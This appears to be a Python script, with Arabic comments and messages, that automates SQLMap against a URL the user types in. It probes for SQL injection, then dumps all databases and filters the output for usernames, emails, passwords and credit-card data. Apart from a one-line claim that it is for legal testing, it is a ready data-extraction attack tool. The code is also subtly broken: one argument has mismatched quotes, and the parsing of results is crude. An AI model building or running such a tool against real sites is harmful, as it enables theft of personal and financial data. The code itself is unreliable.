#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة استخراج البيانات الحساسة الحقيقية باستخدام SQLMap

هذه الأداة تستخدم SQLMap الحقيقي لاستخراج:
- أسماء المستخدمين (usernames)
- كلمات المرور (passwords) 
- عناوين البريد الإلكتروني (emails)
- بطاقات الائتمان (credit cards)

ملاحظة: هذه الأداة مخصصة للاختبار الأمني القانوني فقط
"""

import subprocess
import sys
import os
import json
import tempfile
import time
from datetime import datetime

class RealDataExtractor:
    def __init__(self):
        self.target_url = ""
        self.sqlmap_path = self._find_sqlmap()
        
    def _find_sqlmap(self):
        """البحث عن SQLMap في المسارات الشائعة"""
        possible_paths = [
            "sqlmap",
            "python -m sqlmap", 
            "python3 -m sqlmap",
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "C:\\tools\\sqlmap\\sqlmap.py",
            os.path.join(os.getcwd(), "sqlmap", "sqlmap.py")
        ]
        
        for path in possible_paths:
            try:
                if "python" in path:
                    # اختبار باستخدام python -m sqlmap
                    cmd = path.split() + ["--version"]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        return path
                else:
                    # اختبار المسار المباشر
                    result = subprocess.run([path, "--version"], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        return path
            except:
                continue
        
        return None
    
    def set_target(self, target_url):
        """تعيين الهدف للفحص"""
        self.target_url = target_url
        print(f"🎯 الهدف المعين: {target_url}")
    
    def check_sqlmap_availability(self):
        """التحقق من توفر SQLMap"""
        if not self.sqlmap_path:
            print("❌ SQLMap غير مثبت أو غير موجود في المسار")
            print("📋 يرجى تثبيت SQLMap أولاً:")
            print("   Linux: sudo apt install sqlmap")
            print("   Windows: pip install sqlmap")
            print("   أو من: https://github.com/sqlmapproject/sqlmap")
            return False
        
        print(f"✅ SQLMap متاح: {self.sqlmap_path}")
        return True
    
    def extract_sensitive_data(self, target_url=None):
        """استخراج البيانات الحساسة الحقيقية باستخدام SQLMap"""
        if target_url:
            self.target_url = target_url
        
        if not self.target_url:
            print("❌ يرجى تعيين هدف أولاً")
            return None
        
        if not self.check_sqlmap_availability():
            return None
        
        print(f"\n🔍 بدء استخراج البيانات الحساسة من: {self.target_url}")
        print("⏳ هذه العملية قد تستغرق عدة دقائق...")
        
        # إنشاء ملف مؤقت لتخزين النتائج
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as f:
            temp_file = f.name
        
        try:
            # بناء أمر SQLMap لاستخراج البيانات
            if "python" in self.sqlmap_path:
                base_cmd = self.sqlmap_path.split()
            else:
                base_cmd = [self.sqlmap_path]
            
            cmd = base_cmd + [
                "-u", self.target_url,
                "--batch",
                "--random-agent",
                "--level=3", "--risk=3",
                "--dbs",  # الحصول على قواعد البيانات
                "--tables",  # الحصول على الجداول
                "--columns",  # الحصول على الحقول
                "--dump",  # استخراج البيانات
                "--dump-all",  # استخراج كل البيانات
                "--exclude-sysdbs",  # استبعاد قواعد النظام
                "--output-dir="./sqlmap_results",
                "--fresh-queries"
            ]
            
            print(f"\n📋 الأمر المستخدم: {' '.join(cmd)}")
            print("⚠️  قد تستغرق هذه العملية وقتاً طويلاً حسب حجم البيانات")
            
            # تشغيل SQLMap
            start_time = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)  # 60 دقيقة
            end_time = time.time()
            
            execution_time = end_time - start_time
            print(f"⏱️  وقت التنفيذ: {execution_time:.2f} ثانية")
            
            if result.returncode == 0:
                print("✅ تم استخراج البيانات بنجاح!")
                
                # تحليل النتائج
                extracted_data = self._analyze_sqlmap_output(result.stdout)
                
                if extracted_data:
                    self._display_extracted_data(extracted_data)
                    return extracted_data
                else:
                    print("❌ لم يتم العثور على بيانات حساسة")
                    return None
            else:
                print(f"❌ فشل استخراج البيانات: {result.stderr}")
                return None
                
        except subprocess.TimeoutExpired:
            print("⏰ انتهى الوقت المخصص للفحص")
            print("💡 يمكنك زيادة الوقت باستخدام --timeout=7200 للفحص الأطول")
            return None
        except Exception as e:
            print(f"❌ خطأ غير متوقع: {e}")
            return None
        finally:
            # تنظيف الملف المؤقت
            if os.path.exists(temp_file):
                os.unlink(temp_file)
    
    def _analyze_sqlmap_output(self, output):
        """تحليل مخرجات SQLMap للعثور على البيانات الحساسة"""
        extracted_data = {
            'usernames': [],
            'passwords': [],
            'emails': [],
            'credit_cards': [],
            'databases': [],
            'tables': [],
            'columns_found': []
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line_lower = line.lower()
            
            # البحث عن قواعد البيانات
            if 'available databases' in line_lower:
                extracted_data['databases'].append(line.strip())
            
            # البحث عن الجداول
            if 'database:' in line_lower and 'table:' in line_lower:
                extracted_data['tables'].append(line.strip())
            
            # البحث عن الحقول الحساسة
            if any(field in line_lower for field in ['username', 'password', 'email', 'credit']):
                extracted_data['columns_found'].append(line.strip())
            
            # البحث عن البيانات المستخرجة
            if any(pattern in line_lower for pattern in ['admin', 'user', 'test']):
                if '@' in line and ('.com' in line or '.net' in line or '.org' in line):
                    extracted_data['emails'].append(line.strip())
                elif len(line.strip()) > 3 and line.strip().isalnum():
                    extracted_data['usernames'].append(line.strip())
        
        return extracted_data
    
    def _display_extracted_data(self, data):
        """عرض البيانات المستخرجة"""
        print(f"\n{'='*80}")
        print("📊 البيانات الحساسة المستخرجة - نتائج حقيقية")
        print(f"{'='*80}")
        
        if data['databases']:
            print(f"\n🗄️ قواعد البيانات المكتشفة ({len(data['databases'])}):")
            for db in data['databases'][:5]:  # عرض أول 5 فقط
                print(f"  • {db}")
        
        if data['tables']:
            print(f"\n📋 الجداول المكتشفة ({len(data['tables'])}):")
            for table in data['tables'][:10]:  # عرض أول 10 فقط
                print(f"  • {table}")
        
        if data['columns_found']:
            print(f"\n🔍 الحقول الحساسة المكتشفة ({len(data['columns_found'])}):")
            for column in data['columns_found']:
                print(f"  • {column}")
        
        if data['usernames']:
            print(f"\n👤 أسماء المستخدمين المستخرجة ({len(data['usernames'])}):")
            for username in list(set(data['usernames']))[:10]:  # إزالة التكرارات
                print(f"  • {username}")
        
        if data['emails']:
            print(f"\n📧 عناوين البريد الإلكتروني المستخرجة ({len(data['emails'])}):")
            for email in list(set(data['emails']))[:10]:  # إزالة التكرارات
                print(f"  • {email}")
        
        print(f"\n{'='*80}")
        print("⚠️  تحذيرات أمنية:")
        print("• هذه بيانات حقيقية مستخرجة من النظام")
        print("• يجب إخطار أصحاب النظام فوراً")
        print("• يوصى بتغيير جميع كلمات المرور")
        print("• يجب تأمين النظام ضد هذه الثغرات")
        print(f"{'='*80}")
    
    def quick_test(self, target_url):
        """اختبار سريع للهدف"""
        print(f"🚀 بدء اختبار سريع للهدف: {target_url}")
        
        if not self.check_sqlmap_availability():
            return False
        
        try:
            # اختبار سريع للثغرات
            if "python" in self.sqlmap_path:
                base_cmd = self.sqlmap_path.split()
            else:
                base_cmd = [self.sqlmap_path]
            
            cmd = base_cmd + [
                "-u", target_url,
                "--batch",
                "--random-agent",
                "--level=1", "--risk=1",
                "--dbs",
                "--timeout=30"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                if 'available databases' in result.stdout.lower():
                    print("✅ تم اكتشاف ثغرات SQL Injection!")
                    return True
                else:
                    print("❌ لم يتم اكتشاف ثغرات SQL Injection واضحة")
                    return False
            else:
                print("❌ فشل الاختبار السريع")
                return False
                
        except Exception as e:
            print(f"❌ خطأ في الاختبار السريع: {e}")
            return False

def main():
    """الدالة الرئيسية"""
    print("🛡️ أداة استخراج البيانات الحساسة الحقيقية")
    print("="*50)
    
    extractor = RealDataExtractor()
    
    # طلب الهدف من المستخدم
    target_url = input("\n🎯 الرجاء إدخال URL الهدف (مثال: http://example.com/page.php?id=1): ").strip()
    
    if not target_url:
        print("❌ يجب إدخال URL صحيح")
        return
    
    # التحقق من SQLMap
    if not extractor.check_sqlmap_availability():
        return
    
    # اختبار سريع أولي
    print(f"\n🔍 جارٍ إجراء اختبار سريع للهدف...")
    if extractor.quick_test(target_url):
        print("✅ الهدف قابل للاختبار - بدء الاستخراج الكامل...")
        
        # استخراج البيانات الكاملة
        extracted_data = extractor.extract_sensitive_data(target_url)
        
        if extracted_data:
            print("\n🎉 اكتمل استخراج البيانات الحساسة بنجاح!")
            print("📋 تم حفظ النتائج في ذاكرة البرنامج")
        else:
            print("❌ لم يتم استخراج أي بيانات حساسة")
    else:
        print("❌ الهدف لا يبدو أنه يحتوي على ثغرات SQL Injection واضحة")
        print("💡 جرب هدفاً آخر أو تحقق من صحة URL")

if __name__ == "__main__":
    main()